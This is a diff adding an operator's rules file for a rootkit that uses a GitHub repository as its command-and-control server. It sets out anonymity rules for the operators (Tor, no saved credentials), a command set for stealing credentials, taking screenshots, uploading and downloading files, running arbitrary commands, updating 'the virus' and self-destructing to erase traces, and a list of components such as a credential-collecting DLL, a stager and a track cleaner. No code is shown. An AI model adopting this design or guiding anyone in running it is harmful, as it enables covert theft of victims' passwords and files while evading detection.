@@ -1,0 +1,54 @@
+
+############################################################################
+THOSE ARE THE RULES AND THE COMMANDS TO USE THE GITHUB REPO AS SERVER FOR CLIENT
+PLEASE COPY THIS FILE TO EVERY GITHUB REPO USED FOR THIS USAGE
+
+############################################################################
+SECURITY RULES
+
+1. Please create any repo that might be used by clients with extra care for leaking your identity.
+2. Every connexion to this repo and commits need to be made from an anonymous connexion
+3. Please do not register the credentials of this repo in any git credentials manager
+4. Make avery command line commit from a safe machine, else use tor browser only
+
+FORMATTING RULES
+1. DO NOT MODIFY THE JSON VALUE, PLEASE IT CAUSE BUGS
+2. If you any concern the json formatting, please use the template again, the servant will register again, np
+2. If you need to enter a path, please write it as C:\\Users\\test.exe
+
+############################################################################
+COMMANDS
+
+password => Start every tools to collect credentials and send them back
+screenshot => take a screenshot and upload it to the github repo
+downloadfile <file> => download a file from the github repo and place it in the basic folder
+uploadfile <file> => upload a file from the system to the github repo
+execute_cmd <command> => execute a command on the system and upload a file with the results (command.txt)
+execute_file <name of file> <folder> <params> => execute a file in the system
+delete_file <file> <folder> => delete a file on the system
+update  => download a new instance of the virus 
+selfdestruct <rootkitFullPath> => fully remove every tracks of this rootkit
+
+Some command need to download a file first
+=> password == require CredentialsCollectorDll.dll
+=> escalade == require Escalate.dll
+
+If you want to make an update, first download and execute a new version of the client, then selfdestruct
+the old one. 
+
+SPECIFIC RULES & TIPS on commands 
+=> Please set the selfdestruct command at the end of the three commands possibles.
+=> If the log files are stored under the folder name "RootkitMistake", it means the servant did not get the argv from rootkit
+
+
+############################################################################
+FILES REQUIRED
+
+The following files must be present to be sure the rootkit works well
+
+rules.txt => used for ping
+commands.txt => file to store commands
+results.txt => file to store results from the target
+Stager.exe => create a new instance in the system
+CredentialsCollectorDll.dll => dll file to collect every passwords stored on the target
+Cleaner.exe => delete every tracks of an instance of the rootkit
